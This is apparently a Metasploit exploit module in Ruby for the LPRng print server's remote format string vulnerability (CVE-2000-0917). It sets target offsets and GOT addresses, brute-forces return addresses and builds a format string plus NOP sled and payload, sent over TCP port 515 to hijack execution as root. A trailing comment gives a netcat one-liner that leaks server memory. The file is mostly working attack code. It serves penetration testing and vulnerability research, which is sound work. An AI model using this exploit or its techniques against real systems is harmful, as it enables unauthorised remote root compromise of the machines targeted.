##
# $Id: lprng_format_string.rb 9666 2010-07-03 01:09:32Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##


require 'msf/core'


class Metasploit3 < Msf::Exploit::Remote
	Rank = NormalRanking

	include Msf::Exploit::Remote::Tcp
	include Msf::Exploit::Brute
	include Msf::Exploit::FormatString

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'LPRng use_syslog Remote Format String Vulnerability',
			'Description'    => %q{
					This module exploits a format string vulnerability in the LPRng print server.
				This vulnerability was discovered by Chris Evans. There was a publicly
				circulating worm targeting this vulnerability, which prompted RedHat to pull
				their 7.0 release. They consequently re-released it as "7.0-respin".
			},
			'Author'         => [ 'jduck' ],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: 9666 $',
			'References'     =>
				[
					[ 'CVE', '2000-0917' ],
					[ 'OSVDB', '421' ],
					[ 'BID', '1712' ],
					[ 'US-CERT-VU', '382365' ],
					[ 'URL', 'http://www.cert.org/advisories/CA-2000-22.html' ],
					[ 'URL', 'https://bugzilla.redhat.com/show_bug.cgi?id=17756' ],
					[ 'URL', 'http://www.exploit-db.com/exploits/226' ],
					[ 'URL', 'http://www.exploit-db.com/exploits/227' ],
					[ 'URL', 'http://www.exploit-db.com/exploits/230' ]
				],
			'Platform'       => 'linux',
			'Arch'           => ARCH_X86,
			'Privileged'     => true, # root
			'DefaultOptions' =>
				{
					'PrependSetresuid' => true
				},
			'Payload'        =>
				{
					'Space'    => 130, # buffer size on caldera is 180! (need ~50 for fmt)
					'BadChars' => "\x00\x0a\x20\x25",
				},
			'Targets'        =>
				[
					# tested OK - jjd
					[ 'Caldera OpenLinux 2.3 Bruteforce',
						{
							'Platform'   => 'linux',
							'NumPops'    => 243,
							'FlowHook'   => 0x80992d4,  # GOT of exit
							# (0x809c180+(41+4+10+48)) - data segment, but gets corrupted
							'Bruteforce' =>
								{
									'Start' => { 'Ret' => 0xcffffff4 },
									'Stop'  => { 'Ret' => 0x7fffe004 },
									'Step'  => 16
								}
						}
					],
=begin
					# untested (from public exploits)
					[ 'Slackware 7.0 LPRng-3.6.22.tgz - started from shell',
						{
							'NumPops' 	=> 299,
							'Ret' 	   => 0xbffff640,
							'FlowHook'	=> 0xbfffee30
						}
					],
					[ 'RedHat 7.0 (Guinness) with LPRng-3.6.22/23/24-1 from rpm - glibc-2.2-5',
						{
							'NumPops' 	=> 304,
							'Ret' 	   => 0xbffff920,
							'FlowHook'	=> 0xbffff0f0
						}
					],
					[ 'RedHat 7.0 - Guinesss',
						{
							'NumPops' 	=> 300,
							'Ret' 	   => 0x41424344,
							'FlowHook'	=> 0xbffff3ec
						}
					],
					[ 'RedHat 7.0 - Guinesss-dev',
						{
							'NumPops' 	=> 300,
							'Ret' 	   => 0x41424344,
							'FlowHook'	=> 0xbffff12c
						}
					],
=end
					# ...
					[ 'Debug',
						{
							'NumPops' 	=> 1, # sure to miss.
							'Ret' 	   => 0x41424344,
							'FlowHook'	=> 0x45464748
						}
					]
				],
			# 'DefaultTarget' => 0,
			'DisclosureDate' => 'Sep 25 2000'))

		register_options( [ Opt::RPORT(515) ], self.class )
	end


	def exploit
		# we want to use DPA for this one :)
		fmtstr_set_caps(false, true)

		# check syslog to see which number hits 41414141
=begin
		400.times { |x|
			connect
			buf = "aAAAABBBB|%%%u$x|%u\n" % [x+1, x+1]
			sock.put(buf)
			#handler
			disconnect
		}
=end
		print_status("Trying target #{target.name} ..")

		super
	end


	def brute_exploit(addrs)

		#print_status("Trying target #{target.name} - addr 0x%x..." % addrs['Ret'])

		printed = "Service_connection: bad request line '\\35" # + "'XXXYYYYZZZZ...
		num_start = printed.length + 2 + 4

		# write 'ret' addr to flowhook (execute shellcode)
		# NOTE: the resulting two writes must be done at the same time

		# characters (chr(10) > X > chr(99)) will screw up alignment (\XXX in syslog)
		fmtbuf = "_" * 4
		fmtbuf << generate_fmt_two_shorts(num_start, target['FlowHook'], addrs['Ret'])
		#print_status(" hijacker format string buffer is #{fmtbuf.length} bytes")

		# append payload and newline
		#fmtbuf << payload.encoded
		fmtbuf << "\x90" * 32
		fmtbuf << Rex::Text.charset_exclude(payload_badchars)
		fmtbuf << "\n"

		print_status(" writing 0x%x to 0x%x" % [addrs['Ret'], target['FlowHook']])

		connect
		#print_status("Sleeping, attach now!!")
		#select(nil,nil,nil,5)

		sock.put(fmtbuf)

		handler
		disconnect

	end

end


=begin

HRM!

The following causes info leakage!

bash$ ( ruby -e 'puts "\x09" + ("%x" * 50) + "\n"'; cat) | nc 192.168.0.120 515 | hexdump -vC

There are various other ways to trigger the vulnerability. LPD uses the single-byte commands
0x01 -> 0x09...

It's unclear if there is a way to auto-detect the lpd version via LPD commands.

=end